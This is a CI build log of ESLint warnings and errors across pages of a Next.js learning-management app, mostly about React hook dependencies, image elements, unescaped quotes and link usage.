2025-11-18T17:35:22.2793189Z /home/runner/work/fne-lms/fne-lms/pages/community/transformation/assessment.tsx
2025-11-18T17:35:22.2796077Z ##[warning]  315:6  warning  React Hook useEffect has missing dependencies: 'assessment', 'forceNew', 'requestedArea', and 'router.query'. Either include them or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2798274Z 
2025-11-18T17:35:22.2798696Z /home/runner/work/fne-lms/fne-lms/pages/community/workspace.tsx
2025-11-18T17:35:22.2801518Z ##[warning]   300:6   warning  React Hook useEffect has missing dependencies: 'query.communityId' and 'router'. Either include them or remove the dependency array                                                                                                                             react-hooks/exhaustive-deps
2025-11-18T17:35:22.2805922Z ##[warning]   325:6   warning  React Hook useEffect has missing dependencies: 'initializeWorkspace' and 'user'. Either include them or remove the dependency array                                                                                                                             react-hooks/exhaustive-deps
2025-11-18T17:35:22.2810296Z ##[warning]   331:6   warning  React Hook useEffect has a missing dependency: 'loadWorkspace'. Either include it or remove the dependency array                                                                                                                                                react-hooks/exhaustive-deps
2025-11-18T17:35:22.2815504Z ##[warning]   417:6   warning  React Hook useEffect has an unnecessary dependency: 'supabase'. Either exclude it or remove the dependency array. Outer scope values like 'supabase' aren't valid dependencies because mutating them doesn't re-render the component                            react-hooks/exhaustive-deps
2025-11-18T17:35:22.2821436Z ##[warning]   779:31  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2827172Z ##[warning]  1185:21  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2832751Z ##[warning]  1238:21  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2838231Z ##[warning]  1349:6   warning  React Hook useEffect has missing dependencies: 'checkManagementPermissions', 'loadMeetings', and 'user'. Either include them or remove the dependency array                                                                                                     react-hooks/exhaustive-deps
2025-11-18T17:35:22.2842864Z ##[warning]  1676:6   warning  React Hook useEffect has missing dependencies: 'loadDocuments', 'loadPermissions', and 'user'. Either include them or remove the dependency array                                                                                                               react-hooks/exhaustive-deps
2025-11-18T17:35:22.2848088Z ##[warning]  2059:6   warning  React Hook useEffect has missing dependencies: 'loadCommunityMembers', 'loadMessagingData', 'loadPermissions', 'setupRealtimeSubscription', and 'user'. Either include them or remove the dependency array                                                      react-hooks/exhaustive-deps
2025-11-18T17:35:22.2852998Z ##[warning]  2065:6   warning  React Hook useEffect has a missing dependency: 'loadThreadMessages'. Either include it or remove the dependency array                                                                                                                                           react-hooks/exhaustive-deps
2025-11-18T17:35:22.2857418Z ##[warning]  2071:6   warning  React Hook useEffect has a missing dependency: 'loadThreads'. Either include it or remove the dependency array                                                                                                                                                  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2859361Z 
2025-11-18T17:35:22.2860009Z /home/runner/work/fne-lms/fne-lms/pages/community/workspace/assignments/[id]/discussion.tsx
2025-11-18T17:35:22.2863219Z ##[warning]   35:6   warning  React Hook useEffect has missing dependencies: 'loadData' and 'router'. Either include them or remove the dependency array                                                                                                                                      react-hooks/exhaustive-deps
2025-11-18T17:35:22.2868487Z ##[warning]  337:21  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2870957Z 
2025-11-18T17:35:22.2871570Z /home/runner/work/fne-lms/fne-lms/pages/community/workspace/assignments/[id]/groups.tsx
2025-11-18T17:35:22.2874445Z ##[warning]   30:6   warning  React Hook useEffect has missing dependencies: 'loadData' and 'router'. Either include them or remove the dependency array                                                                                                                                      react-hooks/exhaustive-deps
2025-11-18T17:35:22.2879727Z ##[warning]  255:29  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2882201Z 
2025-11-18T17:35:22.2882618Z /home/runner/work/fne-lms/fne-lms/pages/contract-print/[id].tsx
2025-11-18T17:35:22.2884759Z ##[warning]  59:6  warning  React Hook useEffect has a missing dependency: 'loadContrato'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2886495Z 
2025-11-18T17:35:22.2887009Z /home/runner/work/fne-lms/fne-lms/pages/contracts.tsx
2025-11-18T17:35:22.2889633Z ##[warning]  185:6  warning  React Hook useEffect has missing dependencies: 'loadClientes', 'loadContratos', 'loadProgramas', and 'supabase'. Either include them or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2891680Z 
2025-11-18T17:35:22.2892300Z /home/runner/work/fne-lms/fne-lms/pages/creador-de-cursos.tsx
2025-11-18T17:35:22.2898041Z ##[warning]  69:6  warning  React Hook useEffect has a missing dependency: 'supabase'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2899816Z 
2025-11-18T17:35:22.2900214Z /home/runner/work/fne-lms/fne-lms/pages/dashboard-old.tsx
2025-11-18T17:35:22.2902139Z ##[warning]  70:6  warning  React Hook useEffect has a missing dependency: 'supabase'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2903811Z 
2025-11-18T17:35:22.2904160Z /home/runner/work/fne-lms/fne-lms/pages/dashboard.tsx
2025-11-18T17:35:22.2908977Z ##[warning]   588:29  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2914760Z ##[warning]   633:33  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2922549Z ##[warning]   952:31  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2928428Z ##[warning]  1029:35  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2933907Z ##[warning]  1104:35  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2939400Z ##[warning]  1182:41  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2944835Z ##[warning]  1272:31  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2947437Z 
2025-11-18T17:35:22.2947942Z /home/runner/work/fne-lms/fne-lms/pages/debug-feedback-permissions.tsx
2025-11-18T17:35:22.2949937Z ##[warning]  16:6   warning  React Hook useEffect has a missing dependency: 'checkUser'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2952624Z ##[error]  84:23  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                               react/no-unescaped-entities
2025-11-18T17:35:22.2954989Z ##[error]  84:37  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                               react/no-unescaped-entities
2025-11-18T17:35:22.2957508Z ##[error]  86:54  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                               react/no-unescaped-entities
2025-11-18T17:35:22.2959887Z ##[error]  86:74  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                               react/no-unescaped-entities
2025-11-18T17:35:22.2961447Z 
2025-11-18T17:35:22.2961846Z /home/runner/work/fne-lms/fne-lms/pages/detailed-reports.tsx
2025-11-18T17:35:22.2963902Z ##[warning]  118:6  warning  React Hook useEffect has a missing dependency: 'initializeAuth'. Either include it or remove the dependency array         react-hooks/exhaustive-deps
2025-11-18T17:35:22.2967525Z ##[warning]  126:6  warning  React Hook useEffect has a missing dependency: 'filters.search'. Either include it or remove the dependency array         react-hooks/exhaustive-deps
2025-11-18T17:35:22.2970994Z ##[warning]  132:6  warning  React Hook useEffect has a missing dependency: 'fetchDetailedProgress'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2972754Z 
2025-11-18T17:35:22.2973080Z /home/runner/work/fne-lms/fne-lms/pages/equipo.tsx
2025-11-18T17:35:22.2976739Z ##[warning]  264:19  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2982552Z ##[warning]  360:29  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2988246Z ##[warning]  395:29  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2993758Z ##[warning]  430:29  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2996189Z 
2025-11-18T17:35:22.2996599Z /home/runner/work/fne-lms/fne-lms/pages/expense-reports.tsx
2025-11-18T17:35:22.2999312Z ##[warning]  143:6  warning  React Hook useEffect has missing dependencies: 'loadCategories', 'loadExpenseReports', and 'supabase'. Either include them or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.3001287Z 
2025-11-18T17:35:22.3001603Z /home/runner/work/fne-lms/fne-lms/pages/index.tsx
2025-11-18T17:35:22.3005047Z ##[warning]  171:19   warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3010877Z ##[warning]  379:25   warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3016418Z ##[warning]  382:25   warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3022121Z ##[warning]  387:25   warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3028006Z ##[warning]  390:25   warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3033537Z ##[warning]  449:21   warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3039166Z ##[warning]  458:21   warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3043131Z ##[error]  488:157  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                                                                                                                                                                 react/no-unescaped-entities
2025-11-18T17:35:22.3045999Z ##[error]  488:166  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                                                                                                                                                                 react/no-unescaped-entities
2025-11-18T17:35:22.3050898Z ##[warning]  551:19   warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3056411Z ##[warning]  565:19   warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3062234Z ##[warning]  579:19   warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3067880Z ##[warning]  593:19   warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3073360Z ##[warning]  607:19   warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3078959Z ##[warning]  638:23   warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3084476Z ##[warning]  654:23   warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3090374Z ##[warning]  670:23   warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3095905Z ##[warning]  686:23   warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3101880Z ##[warning]  706:25   warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3107551Z ##[warning]  722:25   warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3113088Z ##[warning]  738:25   warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3118815Z ##[warning]  771:21   warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3124323Z ##[warning]  786:21   warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3129989Z ##[warning]  801:21   warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3135500Z ##[warning]  816:21   warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3141307Z ##[warning]  831:21   warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3146984Z ##[warning]  846:21   warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3149437Z 
2025-11-18T17:35:22.3149814Z /home/runner/work/fne-lms/fne-lms/pages/login-helper.tsx
2025-11-18T17:35:22.3151076Z ##[error]  75:22  error  `'` can be escaped with `&apos;`, `&lsquo;`, `&#39;`, `&rsquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.3152648Z 
2025-11-18T17:35:22.3152966Z /home/runner/work/fne-lms/fne-lms/pages/login.tsx
2025-11-18T17:35:22.3156457Z ##[warning]  227:17  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3162131Z ##[warning]  262:15  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3164529Z 
2025-11-18T17:35:22.3164945Z /home/runner/work/fne-lms/fne-lms/pages/mi-aprendizaje.tsx
2025-11-18T17:35:22.3167199Z ##[warning]  106:6  warning  React Hook useEffect has a missing dependency: 'supabase'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.3168915Z 
2025-11-18T17:35:22.3169384Z /home/runner/work/fne-lms/fne-lms/pages/mi-aprendizaje/ruta/[id].tsx
2025-11-18T17:35:22.3172096Z ##[warning]  96:6  warning  React Hook useEffect has missing dependencies: 'fetchEnhancedProgress' and 'fetchPathDetails'. Either include them or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.3174011Z 
2025-11-18T17:35:22.3174446Z /home/runner/work/fne-lms/fne-lms/pages/mi-aprendizaje/tareas.tsx
2025-11-18T17:35:22.3176493Z ##[warning]  49:6  warning  React Hook useEffect has a missing dependency: 'loadAssignments'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.3178524Z 
2025-11-18T17:35:22.3178902Z /home/runner/work/fne-lms/fne-lms/pages/my-paths/[id].tsx
2025-11-18T17:35:22.3181447Z ##[warning]  96:6  warning  React Hook useEffect has missing dependencies: 'fetchEnhancedProgress' and 'fetchPathDetails'. Either include them or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.3183371Z 
2025-11-18T17:35:22.3183699Z /home/runner/work/fne-lms/fne-lms/pages/nosotros.tsx
2025-11-18T17:35:22.3187313Z ##[warning]  342:19  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3189743Z 
2025-11-18T17:35:22.3190081Z /home/runner/work/fne-lms/fne-lms/pages/noticias.tsx
2025-11-18T17:35:22.3192589Z ##[warning]  129:6   warning  React Hook useEffect has a missing dependency: 'fetchArticles'. Either include it or remove the dependency array                                                                                                                                                react-hooks/exhaustive-deps
2025-11-18T17:35:22.3197205Z ##[warning]  282:9   warning  Custom fonts not added in `pages/_document.js` will only load for a single page. This is discouraged. See: https://nextjs.org/docs/messages/no-page-custom-font                                                                                                 @next/next/no-page-custom-font
2025-11-18T17:35:22.3201310Z ##[error]  285:9   error    Synchronous scripts should not be used. See: https://nextjs.org/docs/messages/no-sync-scripts                                                                                                                                                                   @next/next/no-sync-scripts
2025-11-18T17:35:22.3206153Z ##[warning]  440:19  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3211059Z ##[error]  496:15  error    Do not use an `<a>` element to navigate to `/`. Use `<Link />` from `next/link` instead. See: https://nextjs.org/docs/messages/no-html-link-for-pages                                                                                                           @next/next/no-html-link-for-pages
2025-11-18T17:35:22.3215618Z ##[error]  500:15  error    Do not use an `<a>` element to navigate to `/`. Use `<Link />` from `next/link` instead. See: https://nextjs.org/docs/messages/no-html-link-for-pages                                                                                                           @next/next/no-html-link-for-pages
2025-11-18T17:35:22.3221019Z ##[warning]  615:29  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3223428Z 
2025-11-18T17:35:22.3224010Z /home/runner/work/fne-lms/fne-lms/pages/noticias/[slug].tsx
2025-11-18T17:35:22.3226684Z ##[warning]   59:6   warning  React Hook useEffect has a missing dependency: 'fetchArticle'. Either include it or remove the dependency array                                                                                                                                                 react-hooks/exhaustive-deps
2025-11-18T17:35:22.3231330Z ##[warning]  119:11  warning  Custom fonts not added in `pages/_document.js` will only load for a single page. This is discouraged. See: https://nextjs.org/docs/messages/no-page-custom-font                                                                                                 @next/next/no-page-custom-font
2025-11-18T17:35:22.3235395Z ##[error]  122:11  error    Synchronous scripts should not be used. See: https://nextjs.org/docs/messages/no-sync-scripts                                                                                                                                                                   @next/next/no-sync-scripts
2025-11-18T17:35:22.3239952Z ##[warning]  151:11  warning  Custom fonts not added in `pages/_document.js` will only load for a single page. This is discouraged. See: https://nextjs.org/docs/messages/no-page-custom-font                                                                                                 @next/next/no-page-custom-font
2025-11-18T17:35:22.3244003Z ##[error]  154:11  error    Synchronous scripts should not be used. See: https://nextjs.org/docs/messages/no-sync-scripts                                                                                                                                                                   @next/next/no-sync-scripts
2025-11-18T17:35:22.3248506Z ##[warning]  190:9   warning  Custom fonts not added in `pages/_document.js` will only load for a single page. This is discouraged. See: https://nextjs.org/docs/messages/no-page-custom-font                                                                                                 @next/next/no-page-custom-font
2025-11-18T17:35:22.3252610Z ##[error]  193:9   error    Synchronous scripts should not be used. See: https://nextjs.org/docs/messages/no-sync-scripts                                                                                                                                                                   @next/next/no-sync-scripts
2025-11-18T17:35:22.3257781Z ##[warning]  276:19  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3262543Z ##[error]  332:15  error    Do not use an `<a>` element to navigate to `/`. Use `<Link />` from `next/link` instead. See: https://nextjs.org/docs/messages/no-html-link-for-pages                                                                                                           @next/next/no-html-link-for-pages
2025-11-18T17:35:22.3267212Z ##[error]  336:15  error    Do not use an `<a>` element to navigate to `/`. Use `<Link />` from `next/link` instead. See: https://nextjs.org/docs/messages/no-html-link-for-pages                                                                                                           @next/next/no-html-link-for-pages
2025-11-18T17:35:22.3272242Z ##[warning]  381:19  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3341034Z 
2025-11-18T17:35:22.3341521Z /home/runner/work/fne-lms/fne-lms/pages/pending-approval.tsx
2025-11-18T17:35:22.3343745Z ##[warning]  50:6  warning  React Hook useEffect has a missing dependency: 'supabase'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.3345503Z 
2025-11-18T17:35:22.3345837Z /home/runner/work/fne-lms/fne-lms/pages/profile.tsx
2025-11-18T17:35:22.3348668Z ##[warning]  146:6   warning  React Hook useEffect has missing dependencies: 'session.user' and 'supabase'. Either include them or remove the dependency array                                                                                                                                react-hooks/exhaustive-deps
2025-11-18T17:35:22.3353694Z ##[warning]  446:21  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3359217Z ##[warning]  453:21  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3364630Z ##[warning]  603:23  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3367174Z 
2025-11-18T17:35:22.3367520Z /home/runner/work/fne-lms/fne-lms/pages/programas.tsx
2025-11-18T17:35:22.3370361Z ##[warning]  223:9   warning  Custom fonts not added in `pages/_document.js` will only load for a single page. This is discouraged. See: https://nextjs.org/docs/messages/no-page-custom-font                                                                                                 @next/next/no-page-custom-font
2025-11-18T17:35:22.3374225Z ##[error]  226:9   error    Synchronous scripts should not be used. See: https://nextjs.org/docs/messages/no-sync-scripts                                                                                                                                                                   @next/next/no-sync-scripts
2025-11-18T17:35:22.3379140Z ##[warning]  237:19  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3388495Z ##[error]  254:17  error    Do not use an `<a>` element to navigate to `/`. Use `<Link />` from `next/link` instead. See: https://nextjs.org/docs/messages/no-html-link-for-pages                                                                                                           @next/next/no-html-link-for-pages
2025-11-18T17:35:22.3392899Z ##[error]  258:17  error    Do not use an `<a>` element to navigate to `/`. Use `<Link />` from `next/link` instead. See: https://nextjs.org/docs/messages/no-html-link-for-pages                                                                                                           @next/next/no-html-link-for-pages
2025-11-18T17:35:22.3397390Z ##[error]  290:15  error    Do not use an `<a>` element to navigate to `/`. Use `<Link />` from `next/link` instead. See: https://nextjs.org/docs/messages/no-html-link-for-pages                                                                                                           @next/next/no-html-link-for-pages
2025-11-18T17:35:22.3401554Z ##[error]  294:15  error    Do not use an `<a>` element to navigate to `/`. Use `<Link />` from `next/link` instead. See: https://nextjs.org/docs/messages/no-html-link-for-pages                                                                                                           @next/next/no-html-link-for-pages
2025-11-18T17:35:22.3404927Z ##[error]  314:20  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                                                                                                                                                                 react/no-unescaped-entities
2025-11-18T17:35:22.3408122Z ##[error]  314:44  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                                                                                                                                                                 react/no-unescaped-entities
2025-11-18T17:35:22.3409610Z 
2025-11-18T17:35:22.3409976Z /home/runner/work/fne-lms/fne-lms/pages/quiz-reviews.tsx
2025-11-18T17:35:22.3411814Z ##[warning]  39:6  warning  React Hook useEffect has a missing dependency: 'router'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.3413419Z 
2025-11-18T17:35:22.3413753Z /home/runner/work/fne-lms/fne-lms/pages/reports.tsx
2025-11-18T17:35:22.3415886Z ##[warning]  134:6  warning  React Hook useEffect has a missing dependency: 'initializeAuth'. Either include it or remove the dependency array      react-hooks/exhaustive-deps
2025-11-18T17:35:22.3419831Z ##[warning]  140:6  warning  React Hook useEffect has a missing dependency: 'fetchReportingData'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.3421627Z 
2025-11-18T17:35:22.3422131Z /home/runner/work/fne-lms/fne-lms/pages/student/course/[courseId].tsx
2025-11-18T17:35:22.3424773Z ##[error]  177:16  error    Do not assign to the variable `module`. See: https://nextjs.org/docs/messages/no-assign-module-variable                                 @next/next/no-assign-module-variable
2025-11-18T17:35:22.3428652Z ##[warning]  330:6   warning  React Hook useEffect has missing dependencies: 'modules', 'router', and 'supabase'. Either include them or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.3432170Z ##[error]  372:12  error    Do not assign to the variable `module`. See: https://nextjs.org/docs/messages/no-assign-module-variable                                 @next/next/no-assign-module-variable
